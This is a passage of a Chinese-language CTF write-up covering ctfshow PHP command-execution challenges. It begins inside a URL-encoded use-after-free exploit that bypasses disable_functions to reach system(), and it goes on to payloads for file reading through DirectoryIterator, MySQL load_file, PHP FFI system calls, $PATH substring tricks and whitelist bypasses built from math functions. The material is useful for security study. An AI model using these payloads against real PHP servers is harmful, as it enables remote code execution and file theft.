0%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20<span class="hljs-string">&#x27;WIN&#x27;</span>))%20%7B%0A%20%20%20%20%20%20%20%20die(<span class="hljs-string">&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;</span>)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>)%3B%0A%0A%20%20%20%20trigger_uaf(<span class="hljs-string">&#x27;x&#x27;</span>)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B<span class="hljs-string">&#x27;args&#x27;</span>%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn<span class="hljs-string">&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;</span>t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn<span class="hljs-string">&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;</span>t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E<br></code></pre></td></tr></table></figure>
<p>经过url编码之后的payload</p>
<h2 id="web73"><a class="markdownIt-Anchor" href="#web73"></a> web73</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure>
<p>先查一下在哪，得到flagc.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flagc.txt&quot;</span>);ob_flush();<br>或者<br>c=include(<span class="hljs-string">&quot;/flagc.txt&quot;</span>);ob_flush();<br></code></pre></td></tr></table></figure>
<h2 id="web74"><a class="markdownIt-Anchor" href="#web74"></a> web74</h2>
<p>流程和上面的基本一致，flag在flagx.txt里面</p>
<h2 id="web75"><a class="markdownIt-Anchor" href="#web75"></a> web75</h2>
<p>可以继续用上面的原生类找到对应的文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure>
<p>找到文件flag36.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">try &#123;<br>	<span class="hljs-comment"># 创建 PDO 实例, 连接 MySQL 数据库</span><br>	<span class="hljs-variable">$dbh</span> = new PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>	<br>	<span class="hljs-comment"># 在 MySQL 中，load_file(完整路径) 函数读取一个文件并将其内容作为字符串返回。</span><br>	foreach(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) as <span class="hljs-variable">$row</span>) &#123;<br>		<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$row</span>[0]).<span class="hljs-string">&quot;|&quot;</span>;<br>	&#125;<br>	<br>	<span class="hljs-variable">$dbh</span> = null;<br>&#125;<br><br>catch (PDOException <span class="hljs-variable">$e</span>) &#123;<br>	<span class="hljs-built_in">echo</span> <span class="hljs-variable">$e</span>-&gt;getMessage();<span class="hljs-built_in">exit</span>(0);<br>&#125;<br><br><span class="hljs-built_in">exit</span>(0);<br></code></pre></td></tr></table></figure>
<p>通过 PDO（PHP Data Objects）连接到 MySQL 数据库，并尝试读取服务器上的文件内容</p>
<p><code>load_file(&quot;/flag36.txt&quot;)</code> 是 MySQL 的函数，用于读取服务器上指定路径的文件内容。函数返回文件内容的字符串。</p>
<p><code>foreach</code> 循环遍历查询结果。因为 <code>load_file</code> 函数返回的是一个字符串，<code>$row[0]</code> 就是这个字符串。<code>echo($row[0]).&quot;|&quot;;</code> 将文件内容打印出来，并在内容后面加上 <code>|</code> 符号。</p>
<p>之后关闭数据库连接，捕捉异常信息。</p>
<p>上传payload的时候记得去掉注释</p>
<h2 id="web76"><a class="markdownIt-Anchor" href="#web76"></a> web76</h2>
<p>也是继续用原生类进行目录扫描得到flag在flag36d.txt里面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure>
<p>然后还是用上面的sql执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=try &#123;<br>	<span class="hljs-variable">$dbh</span> = new PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>	<br>	foreach(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) as <span class="hljs-variable">$row</span>) &#123;<br>		<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$row</span>[0]).<span class="hljs-string">&quot;|&quot;</span>;<br>	&#125;<br>	<br>	<span class="hljs-variable">$dbh</span> = null;<br>&#125;<br><br>catch (PDOException <span class="hljs-variable">$e</span>) &#123;<br>	<span class="hljs-built_in">echo</span> <span class="hljs-variable">$e</span>-&gt;getMessage();<span class="hljs-built_in">exit</span>(0);<br>&#125;<br><br><span class="hljs-built_in">exit</span>(0);<br></code></pre></td></tr></table></figure>
<h2 id="web77"><a class="markdownIt-Anchor" href="#web77"></a> web77</h2>
<p>还是可以继续使用原生类进行目录的扫描，可以得到flag在flag36x.txt里面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure>
<p>但是之前的写法是不能继续用的报<code> could not find driver</code>的错误，此题利用的是PHP 7.4+的FFI特性，即外部函数接口特性，</p>
<p>先上payload跟着学习一下内容吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>讲一下简单的原理</p>
<p>这段 PHP 代码利用了 Foreign Function Interface (FFI) 扩展来调用 C 语言的 <code>system</code> 函数，从而执行系统命令。注意需要php版本在7.4及以上才有</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<br><span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p><code>FFI::cdef</code>函数的作用是定义一个c函数的接口，<code>system</code> 是一个接受一个 <code>const char *</code> 类型参数的函数（也就是一个字符串），并返回一个整数。接下来是执行/readflag讲它的输出重定向到1.txt里面，然后最后一步代码进行执行</p>
<h2 id="web118"><a class="markdownIt-Anchor" href="#web118"></a> web118</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">看源码有个code传入，尝试一下有evil，fuzz看看内容发现<span class="hljs-code">`A-Z`</span>~,<span class="hljs-code">`@ # $ _ &#123;&#125; : ; ? . `</span>这些可以正常的输入，浅浅的学习一下吧<br><br><span class="hljs-code">`echo $PATH`</span> 是一个常见的 Linux 或 Unix 系统命令，用来显示当前用户的 <span class="hljs-code">`PATH`</span> 环境变量的值。<span class="hljs-code">`PATH`</span> 环境变量是一个包含目录路径的列表，操作系统会按照这些路径的顺序查找可执行文件。如下<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iZ0jl9s6tb2yuz8o6oleiyZ:~# <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br></code></pre></td></tr></table></figure>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">输入echo $&#123;PATH:~0&#125;会回显n其实因为$PATH的最后一位是n $PWD的最后一位 也就是 /var/www/html的最后一位是l，那么可以执行<br>code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???<br></code></pre></td></tr></table></figure>
<p>就相当于执行了<code>nl flag.php</code>然后看源码就行了</p>
<h2 id="web119"><a class="markdownIt-Anchor" href="#web119"></a> web119</h2>
<p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/119.png" srcset="/img/loading.gif" lazyload alt="119"></p>
<h2 id="web120"><a class="markdownIt-Anchor" href="#web120"></a> web120</h2>
<p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/120.png" srcset="/img/loading.gif" lazyload alt="120"></p>
<h2 id="web121"><a class="markdownIt-Anchor" href="#web121"></a> web121</h2>
<p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/121.png" srcset="/img/loading.gif" lazyload alt="121"></p>
<h2 id="web122"><a class="markdownIt-Anchor" href="#web122"></a> web122</h2>
<p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/122.png" srcset="/img/loading.gif" lazyload alt="122"></p>
<h2 id="web124"><a class="markdownIt-Anchor" href="#web124"></a> web124</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: 收集自网络</span><br><span class="hljs-comment"># @Date:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-06 14:04:45</span><br><br>*/<br><br>error_reporting(0);<br>//听说你很喜欢数学，不知道你是否爱它胜过爱flag<br><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    show_source(__FILE__);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    //例子 c=20-1<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$content</span>) &gt;= 80) &#123;<br>        die(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="hljs-string">    foreach (<span class="hljs-variable">$blacklist</span> as <span class="hljs-variable">$blackitem</span>) &#123;</span><br><span class="hljs-string">        if (preg_match(&#x27;/&#x27; . <span class="hljs-variable">$blackitem</span> . &#x27;/m&#x27;, <span class="hljs-variable">$content</span>)) &#123;</span><br><span class="hljs-string">            die(&quot;</span>请不要输入奇奇怪怪的字符<span class="hljs-string">&quot;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br><span class="hljs-string">    <span class="hljs-variable">$whitelist</span> = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="hljs-string">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  </span><br><span class="hljs-string">    foreach (<span class="hljs-variable">$used_funcs</span>[0] as <span class="hljs-variable">$func</span>) &#123;</span><br><span class="hljs-string">        if (!in_array(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;</span><br><span class="hljs-string">            die(&quot;</span>请不要输入奇奇怪怪的函数<span class="hljs-string">&quot;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    //帮你算出答案</span><br><span class="hljs-string">    eval(&#x27;echo &#x27;.<span class="hljs-variable">$content</span>.&#x27;;&#x27;);</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
<p>这题认真学习一下，题目是ciscn-2019的love math 怪不得感觉眼熟</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=20-1<br>回显是19<br></code></pre></td></tr></table></figure>
<h3 id="0x01-17"><a class="markdownIt-Anchor" href="#0x01-17"></a> 0x01</h3>
<p>已知的是php可以进行嵌套比如说</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$orange=&#x27;system&#x27;;$orange(&#x27;cat /flag&#x27;);<br>实际就是执行system(&#x27;cat /flag&#x27;);<br></code></pre></td></tr></table></figure>
<p>所以可以尝试进行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=(<span class="hljs-variable">$_GET</span>[a])(<span class="hljs-variable">$_GET</span>[b])&amp;a=system&amp;b=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>
<p>a和b不能用可以用函数代替</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=(<span class="hljs-variable">$_GET</span>[pi])(<span class="hljs-variable">$_GET</span>[abs])&amp;pi=system&amp;abs=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>
<p>有个老生常谈的函数hex2bin将十六进制进行转化为ASCII，_GET的十六进制是<code>5f474554</code>,但是也没有hex2bin，也不能填这些但是里面有个函数是<code>base_convert</code>，可以用这个函数构造hex2bin，36进制包含0-9和A-Z,转化为十进制就是<code>37907361743</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">base_convert(37907361743,10,36)  <span class="hljs-comment">#构造出hex2bin</span><br></code></pre></td></tr></table></figure>
<p>再利用函数<code>dechex</code>函数十进制转化为十六进制<code>1598506324</code>,构造的流程如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">base_convert(37907361743,10,36)(dechex(1598506324));<br>--&gt; hex2bin(dechex(1598506324));<br>--&gt; hex2bin(5f474554);<br>--&gt; _GET<br></code></pre></td></tr></table></figure>
<p>最后构造payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-variable">$pi</span>=base_convert(37907361743,10,36)(dechex(1598506324));($<span class="hljs-variable">$pi</span>)&#123;pi&#125;(($<span class="hljs-variable">$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php;<br></code></pre></td></tr></table></figure>
<p><code>($_GET)&#123;pi&#125;(($_GET)&#123;abs&#125;)</code>然后传入内容执行代码</p>
<h3 id="0x02-17"><a class="markdownIt-Anchor" href="#0x02-17"></a> 0x02</h3>
<p>原题也可以利用<code>getallheaders</code>,但是本题的环境有些变化</p>
<h3 id="0x03-4"><a class="markdownIt-Anchor" href="#0x03-4"></a> 0x03</h3>
<p>先上payload，看看大佬的思路</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-variable">$pi</span>=(is_nan^(6).(4)).(tan^(1).(5));<span class="hljs-variable">$pi</span>=$<span class="hljs-variable">$pi</span>;<span class="hljs-variable">$pi</span>&#123;0&#125;(<span class="hljs-variable">$pi</span>&#123;1&#125;)&amp;0=system&amp;1=<span class="hljs-built_in">tac</span> flag.php;<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$payload</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>,  <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span> , <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=1;<span class="hljs-variable">$k</span>&lt;=sizeof(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = 0;<span class="hljs-variable">$i</span> &lt; 9; <span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = 0;<span class="hljs-variable">$j</span> &lt;=9;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-variable">$exp</span> = <span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>] ^ <span class="hljs-variable">$i</span>.<span class="hljs-variable">$j</span>;<br>            <span class="hljs-built_in">echo</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">&quot;^$i<span class="hljs-variable">$j</span>&quot;</span>.<span class="hljs-string">&quot;==&gt;<span class="hljs-variable">$exp</span>&quot;</span>);<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;br 